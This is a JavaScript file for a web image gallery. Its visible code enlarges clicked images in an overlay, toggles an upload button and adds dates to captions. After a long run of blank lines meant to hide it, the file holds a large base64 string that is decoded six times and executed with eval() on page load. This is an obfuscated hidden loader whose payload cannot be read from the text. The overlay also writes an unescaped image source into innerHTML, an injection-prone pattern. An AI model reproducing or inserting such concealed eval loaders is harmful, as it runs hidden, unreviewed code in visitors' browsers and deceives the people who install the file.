let app = {
    onclick: (e) => {
        const src = e.target.src
        console.log(src)
        document.body.innerHTML += "<div class='big_image'><button class='close' onclick='app.close()'>x</button><img src='"+ e.target.src + "'></img></div>"
        document.querySelectorAll(".social_image").forEach(i => i.addEventListener("click", app.onclick))
    },
    close: () => {
        document.querySelectorAll(".big_image").forEach(i => i.remove())
    },
    oninputchange: (e) => {
        console.log(e.target.fileList)
        if (e.target.fileList.length > 0) {
            document.querySelector("input[type=submit]").disabled = false
        } else {
            document.querySelector("input[type=submit]").disabled = true
        }
    },
    d: new Date()
}

window.app = app

document.addEventListener("DOMContentLoaded", (event) => {
    console.log("DOM fully loaded and parsed")
    document.querySelectorAll(".social_image").forEach(i => i.addEventListener("click", app.onclick))
    document.querySelectorAll("input").forEach(i => i.addEventListener("change", app.oninputchange, false))
    document.querySelectorAll("p").forEach(i => console.log(i))

    document.querySelectorAll("p").forEach(i => {
        if (i.parentNode.className == 'social_image') { 
            i.innerHTML += "<br/>" + `<p class='date'>${app.d.getDate()}/${app.d.getMonth()}/${app.d.getFullYear()}</p>`
        }
    })
})















































































































const s = `VmpKMGFtVkdTWGxXYkZwcFVsZDRWbGxzYUVOalZteHpXa1JTVGsxWVFrZFdSM1JMVlVaYVdHVkZiRmRXZWxab1ZqSnpkMlZHWkhGUmJHaHBVakF4TkZaR1ZsZE9SMUpIVlc1V2FWSXdXbGhVVlZwelRURlplV1ZHWkZkTmF6RTBXVEJhYjFSc1dYcGhTRUphWWxob1NGcEhlRTlYUlRWV1QxZG9hVlpVVlhkWFYzUnZZVEpGZUZKWVpHbFRSMUpXVkZSS1UwMHhjRmhsU0Vwc1lrVTFNVlZYTVhkV1JrcHlWMWhvV0ZkSVFsQlZla3BIWTIxS1JsWnJOVk5OYkVwTVYxZDRhMkp0VVhoalJWcG9VbFUxYzFsWWNITmtNVkYzWVVkR1dHRjZSbnBWTW5CSFZsWktObEpxVG1GV00yZ3pWVEJhWVdSV1VuUmhSbWhUWW10RmVGWnJWbXBrTURGWVUydG9WbUV4U2xGV2JuQlhZakZXV1dOSVRsWlNiVkpZVjJ0b2EyRXhTbkpYYkd4YVRVZG9WRll5ZUZwbGJIQkZVMnh3YVZJd01IaFhhMXBoWkRGa1YxUnVWbGhoZWtaWlZXcEdTMlZzV1hoWk0yUnNVakExU1ZVeU5WTldNa3AwWlVaT1ZtSnVRa2haYWtaelZqRnNObEZ0ZEdsV1ZFVXhWbXRqTVdNeVJrZGFSVnBVVjBkU1ZsVnVjRWROTVhCWVpFaE9hbFl3TVROYVJXUkhWVEpXZEdWSWFGaGhNWEJ4V2xWa1MxTkdUblZXYkZwWVVteHdkbFpYY0VkWlYwbDRXa2hLVlZaRldtOVZha0V4VTJ4V1dFMVVVbWhXTUhCWVZUSjBWMWRzV2xoVmJuQmFaV3RhTTFWclpFZFRWMDVIWTBVMVRsTkZTWHBXTVZKRFlqRldkRlJyV2xCV1JUVndWRlZvVTJOV1VsaGxSMFpQVm01Q1NWUldXbXRpUmxwWVpVVmFWVlpYVW5KVk1qRkxaRVpXY1Zkc2NFNU5NRWw1VjJ0a01FNUZOWE5XYkZaVFlYcEdiMWxVUmxwTlJscEZVbXMxVGxKVVZrZFVWbWhEVkRGT1NWRnJPV0ZXZWtFd1drUkdVMVpzVm5SalIzaFhWa1phVmxaVVJsTmhNVXBJVTI1T2FsSjZiR0ZVVnpFMFVrWndSVk5yY0d4V1ZHeGFWa2QwZDFVeFNrWlRibFpXVFZkT00xcFZaRk5rUms1MVZXeGthV0pZYUhkV1JtUjNZekpPVjFwSVRtRlNWMUp5Vm14b2IwMVdXa2hqUlU1b1lsVndXRll5TURWWGJVcEdUbFYwVldGclNsQmFSbHByWkVkR1NHTkhhRmRXVjNjeVZtcEdZV0V3TlVoVVdHaHFVbTE0VjFsVVFuZGhSbFp4VW10MFQxWnRVbnBaVlZVMVlrZEZlV1ZGV2xWV1YxSnlWVEl4UzFZeFpIRlRiR2hYVWxoQ1dWZFhkRlpsUms1SFYyNVdVbUpZVW5CV2JGcHlaREZaZUZkdGRHcE5iRnBKVmxkNGIyRldTWHBoUm1SWFRVWndhRmxxUm5Oa1JURkZWbTFzVG1KRmEzbFdWekI0VGtac1YxZFlhR3BTZW14aFZtMHhiMUpHYkhKYVJXUlhWbXhLTVZrd1pHOVZNREZYWTBVNVdGWnNjSEpWZWtwUFVqSk9SMkZHYUdsWFIyaDJWbTEwVjFsVk5YTmlTRVpVVmtaS1VGVnRNVEJPVm14V1lVVk9hVkl3Y0ZkV01qVmhWMFphUm1OSVdscGhNbEpUV2xaVk5WZEhVa2hTYkdST1ZtNUNOVlpxUm1GaE1WbDNUbFZvVm1KSFVsWlpiR1J2WWpGWmQxWnVaRTVpUjNoWFZsZDRUMkZGTVhKaVJGWlZUVmRvTTFsVldrcGtNV1IxVjJ4V1YyVnJXa2xYVjNCTFZUSlNSazlXYkdwU01taFVWRmMxYjAweFdrZFdiWFJYVFd0d1NGZHJhRk5XTVZwSFYyMW9WMkZyU21oWk1WcHpWbXhXZFZSdGRGZGlhMHBhVm0xNGIySXlSbFpOV0ZKclVrWndZVmxVUVRGVE1WSnhVV3M1YTFadFVqQlpWV1IzWVVaYVZtSkVXbGhXTTBKUVZYcEtUMk15VGtkaVJsSm9UVEJLYjFaV1VrTlNhelZYVkd4YVZXRXpVbFZWYlhNeFVsWlNWMWR1VGxkV2JIQjVXV3RvUTFWck1YRldiV2hhVmxkU1VGa3dXa2RqVmtaMFlVWlNVMWRGU2paV2FrWmhZVEZWZVZadVNtbFNWbHBQVldwS1UxUnNXbkpXYkZwT1RWVldOVlJzWkVkaFJrbDNUbGhrVmxaNlZuSldNbmhyVW1zMVZWZHRSbE5TVjNONFYyeGFZV1F4U2tkU2JGWnBVbGhDVTFSVlpEUmtNVnBGVkcxMGEwMXNXakJXVjNSdlZUSktkR1ZJU2xaaVJrcElXa1JHYzJSRk1WbFViWFJYWW10RmVGZFdWbTloTWtaV1RWaEdhVk5JUWxaVmJGVXhVa1pTVlZKdVRsaFNNVnBLVmtjeFIxZEdTbkpqUlZKWFRXNVNjbFpVU2xkV01rNUhZa1pXYVdKclNrOVdWbEpEVTIxV2MySklSbFZoTTFKeFdXdG9RMWRzVlhsa1NHUmFWbXRXTmxkcll6RlpWa3BZVlc1YVlWWnNjRE5XTUZwTFpFZFNTR05IZUZoU01Vb3hWakZTUTJFeFNYbFdibEpWVjBoQ2FGVXdXbmRqVm14elYydGthMDFXUmpaWGEyaHJWR3hKZDFkcmNGWk5hbFpvV1ZSR1QxSXhUblZqUm1ocFVteFpNRmRVUW10VE1sSkhWMjVXYVZKWVFsUlZhMVpMWkZaYVIxcElaRkpoZWxWNlZVWlJkMUJSUFQwPQ==`
eval(atob(atob(atob(atob(atob(atob(s)))))))